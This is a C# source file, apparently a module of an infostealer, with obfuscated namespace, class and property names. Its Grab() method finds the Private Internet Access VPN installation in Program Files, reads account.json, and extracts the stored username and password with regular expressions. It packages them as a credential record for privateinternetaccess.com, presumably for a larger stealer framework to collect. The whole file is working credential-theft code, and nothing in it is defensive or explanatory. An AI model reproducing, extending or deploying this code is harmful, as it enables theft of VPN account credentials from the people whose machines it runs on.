using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using C6Zy;

namespace rk937aHHc
{
	public class Private_InternetAccess : EtbH
	{
		public Private_InternetAccess()
		{
			this.sUHHlAMM = "Private Internet Access";
		}

		public string sUHHlAMM { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();

            string pathX86 = Path.Combine(
                Environment.GetEnvironmentVariable("ProgramFiles(x86)"),
                "Private Internet Access\\data"
            );

            string pathX64 = Path.Combine(
                Environment.ExpandEnvironmentVariables("%ProgramW6432%"),
                "Private Internet Access\\data"
            );

            string baseDir = "";

            if (Directory.Exists(pathX64))
            {
                baseDir = pathX64;
            }
            else if (Directory.Exists(pathX86))
            {
                baseDir = pathX86;
            }
            else
            {
                return list;
            }

            string accountFile = Path.Combine(baseDir, "account.json");

            if (!File.Exists(accountFile))
                return list;

            try
            {
                string json = File.ReadAllText(accountFile);

                string username = Regex
                    .Match(json, "\"username\":\"(.*?)\"")
                    .Groups[1]
                    .Value;

                string password = Regex
                    .Match(json, "\"password\":\"(.*?)\"")
                    .Groups[1]
                    .Value;

                list.Add(new WTitxI2m
                {
                    data1 = "privateinternetaccess.com",
                    data2 = username,
                    data3 = password,
                    data4 = "Private Internet Access"
                });
            }
            catch
            {
                return new List<WTitxI2m>();
            }

            return list;
        }
    }
}
